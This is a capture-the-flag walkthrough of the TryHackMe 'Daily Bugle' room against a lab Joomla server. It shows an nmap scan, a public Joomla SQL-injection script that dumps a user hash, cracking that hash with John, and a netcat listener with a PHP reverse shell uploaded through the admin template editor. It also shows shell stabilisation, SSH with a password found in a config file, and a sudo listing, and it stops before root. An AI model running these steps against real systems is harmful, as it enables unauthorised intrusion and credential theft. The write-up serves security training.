# Daily Bugle

**Room Link:** [https://tryhackme.com/room/dailybugle](https://tryhackme.com/room/dailybugle)



### **Deploy**

**Access the web server, who robbed the bank?**

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### Obtain user and root

```
nmap -A 10.10.116.159
```

![](<../../.gitbook/assets/image (18).png>)



**Python Script**

```
git clone https://github.com/stefanlucas/Exploit-Joomla.git 
cd Exploit-Joomla/ 
python3 joomblah.py http://10.10.116.159
```

<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

```
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session

```

### Cracking the hash

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
```

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

We can  now login to Joomla with the credentials we have found

```
Username: jonah
Password: spiderman123
```

<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

### Reverse Shell

All I did was follow this tutorial to get a reverse shell.&#x20;

**Tutorial:** [https://www.hackingarticles.in/joomla-reverse-shell/](https://www.hackingarticles.in/joomla-reverse-shell/)

**Kali**

```
nc -lvp 1234
```

**Browser**

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Used this PHP reverse shell, just needed to change the IP to my own.

**PHP Reverse Shell:** [https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

<figure><img src="../../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```

Found a password in the configuration file. The password worked for the user jjameson which was found in the home directory.

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

```
ssh jjameson@10.10.116.159
Password: nv5uz9r3ZEDzVjNu
```



jjamerson is able to run yum with no password as sudo

```
sudo -l
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>



